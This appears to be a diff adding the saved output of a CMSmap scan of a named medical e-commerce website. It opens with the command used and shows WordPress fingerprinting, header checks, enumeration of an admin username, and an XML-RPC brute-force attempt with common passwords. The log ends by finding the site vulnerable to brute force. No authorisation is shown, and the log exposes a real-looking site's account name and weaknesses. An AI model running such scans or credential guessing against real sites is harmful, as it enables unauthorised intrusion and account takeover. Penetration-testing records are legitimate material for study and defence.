@@ -1,0 +1,65 @@
+./cmsmap.py https://www.medicalsupermarket.my/ -f W -v -o medicalsupermarket.my.txt
+[-] Date & Time: 13/04/2021 10:07:43
+[-] ExploitDB and CMSmap plugins are not updated to the latest version
+[-] Would you like to update it?
+[-] Updating wordpress versions
+[-] Updating joomla versions
+[-] Updating drupal versions
+[-] Updating moodle versions
+[-] Updating wordpress small plugins
+[-] Updating joomla small plugins
+[-] Updating drupal small plugins
+[v] Update CMSs in tmp folder
+[I] Threads: 5
+[-] Target: https://www.medicalsupermarket.my (110.4.45.23)
+[v] Requesting Not Existing Pages ...
+[v] Checking if the website is in HTTPS ...
+[v] Checking headers ...
+[I] Server: nginx
+[I] X-Powered-By: PHP/7.3.27
+[L] X-Frame-Options: Not Enforced
+[I] Strict-Transport-Security: Not Enforced
+[I] X-Content-Security-Policy: Not Enforced
+[I] X-Content-Type-Options: Not Enforced
+[v] Checking Robots.txt File ...
+[L] Robots.txt Found: https://www.medicalsupermarket.my/robots.txt
+[I] CMS Detection: WordPress
+[v] Checking WordPress version ...
+[I] Wordpress Version: 5.4.4
+[v] Core vulnerabilities for version 5.6.2
+[v] Core vulnerabilities for version 5.6.1
+[v] Core vulnerabilities for version 5.6
+[v] Core vulnerabilities for version 5.5.3
+[v] Core vulnerabilities for version 5.5.2
+[v] Core vulnerabilities for version 5.5.1
+[v] Core vulnerabilities for version 5.5
+[v] Core vulnerabilities for version 5.4.4
+[v] Checking WordPress theme ...
+[I] Wordpress Theme: storefront
+[v] Searching vulnerable theme (storefront) from local ExploitDB repository ...
+[v] Checking old WordPress config files ...
+[v] Enumerating Wordpress usernames via "Feed" ...
+[v] Enumerating Wordpress usernames via "Author" ...
+[-] WordPress usernames identified: 
+[M] sunshinegeekmedical
+[v] Checking if XML-RPC services are enabled ...
+[M] XML-RPC services are enabled
+[v] Starting XML-RPC Brute Forcing
+[v] Trying Credentials: sunshinegeekmedical password
+[v] Trying Credentials: sunshinegeekmedical admin
+[v] Trying Credentials: sunshinegeekmedical 123456
+[v] Trying Credentials: sunshinegeekmedical Password1
+[v] Trying Credentials: sunshinegeekmedical sunshinegeekmedical
+[v] Checking XML-RPC Pingback Vulnerability ...
+[v] Checking XML-RPC Brute Force Vulnerability ...
+[M] Website vulnerable to XML-RPC Brute Force Vulnerability
+[v] Checking WordPress forgotten password ...
+[v] Checking Autocomplete Off on the login page ...
+[I] Autocomplete Off Not Found: https://www.medicalsupermarket.my/wp-login.php
+[v] Checking WordPres default files...
+[-] Default WordPress Files:
+[I] https://www.medicalsupermarket.my/wp-includes/ID3/license.commercial.txt
+[v] Checking WordPress plugins in the index page
+[-] Searching Wordpress Plugins ...
+[ERROR] Interrupt caught. CMSmap paused. Do you really want to exit?
+[-] Bye! Quitting..
